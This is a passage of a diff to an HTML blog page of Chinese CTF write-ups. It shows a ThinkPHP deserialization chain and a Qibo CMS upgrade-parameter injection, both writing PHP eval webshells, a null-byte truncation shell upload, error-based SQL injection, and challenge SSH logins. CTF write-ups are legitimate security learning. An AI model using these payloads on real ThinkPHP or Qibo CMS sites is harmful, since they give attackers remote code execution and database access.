+&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
 &lt;/code>&lt;/pre>&lt;p>虽然会返回一个报错的页面，但是可以在&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>处验证一下是否写上了🐎，文件名字是&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>，连接密码是ccc 直接蚁剑&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
 &lt;p>在&lt;a href="http://www.snowywar.top/?p=2424">雪殇的wp&lt;/a>中用的是另一个，更直接的写🐎方式，下面说一下思路（大概&lt;/p>
@@ -1422,7 +1422,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
 &lt;p>抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎&lt;/p>
-&lt;pre>&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
+&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
 &lt;p>将🐎写进的目标页面&lt;code>/runtime/client_upgrade_edition.php&lt;/code>连入蚁剑 拿flag即可&lt;/p>
 &lt;p>————比赛的时候我其实是没有搜到&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过&lt;/p>
@@ -1490,7 +1490,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;span style="color:#111">}&lt;/span>
 &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
 &lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了&lt;/p>
-&lt;pre>&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
+&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
 POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
 &lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
 &lt;h2 id="easyweb">easyweb&lt;/h2>
@@ -1546,7 +1546,7 @@ POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
 &lt;blockquote>
 &lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
 &lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that’s left is one shell session.&lt;/p>
-&lt;pre>&lt;code>ssh rmrfer@178.154.210.26
+&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
 Password: sa7Neiyi
 &lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
 &lt;p>&lt;strong>Added at 13:45 —&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
@@ -1596,13 +1596,13 @@ Password: sa7Neiyi
 &lt;p>简约漂亮的前端&lt;/p>
 &lt;p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&amp;amp;email=xxxx
 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) 随email而改变，尝试注入&lt;/p>
-&lt;pre>&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
+&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
 digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
 digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
 &lt;/code>&lt;/pre>&lt;p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>可利用的部分是可以插入的email，报错注入&lt;/p>
-&lt;pre>&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
+&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
 digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
 digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
 digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
@@ -1676,7 +1676,7 @@ digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x
 &lt;p>可以玩出很多花样~&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
 &lt;p>书归正题，这里使用&lt;code>toilet -f bigascii9 +command&lt;/code>的命令生成结果，将空格换为 &lt;code>.&lt;/code>再发送即可&lt;/p>
-&lt;pre>&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
+&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
 cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
 toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
 cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
@@ -1695,7 +1695,7 @@ cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
 &lt;p>（说实话，pacp包是真的不会看TAT&lt;/p>
 &lt;p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">官方视频中&lt;/a>确实这样可以成功 emmmm&lt;/p>
-&lt;pre>&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
+&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
 php -a
 foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
 &lt;/code>&lt;/pre>&lt;p>（以下是在&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">别的wp&lt;/a>中看到的py脚本： 可成功复现 导出455张jpg图&lt;/p>
@@ -1714,7 +1714,7 @@ foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents
 &lt;blockquote>
 &lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
 &lt;p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
-&lt;pre>&lt;code>ssh localhost@109.233.61.10
+&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
 Password: ohx7eeQu
 &lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
 &lt;/blockquote>
@@ -1726,11 +1726,11 @@ Password: ohx7eeQu
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
 &lt;p>提示&lt;em>Flag-containing-Records&lt;/em> 接着访问两个超链接的内容&lt;/p>
 &lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：&lt;/p>
-&lt;pre>&lt;code>bind 127.0.0.1
+&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
 protected-mod yes
 port 6379
 &lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>也是相关的配置文件 只有一句没被注释&lt;/p>
-&lt;pre>&lt;code>net.ipv4.conf.all.route_localnet=1
+&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
 &lt;/code>&lt;/pre>&lt;p>查google，发现了这些：&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
 &lt;p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：&lt;/p>
 &lt;blockquote>
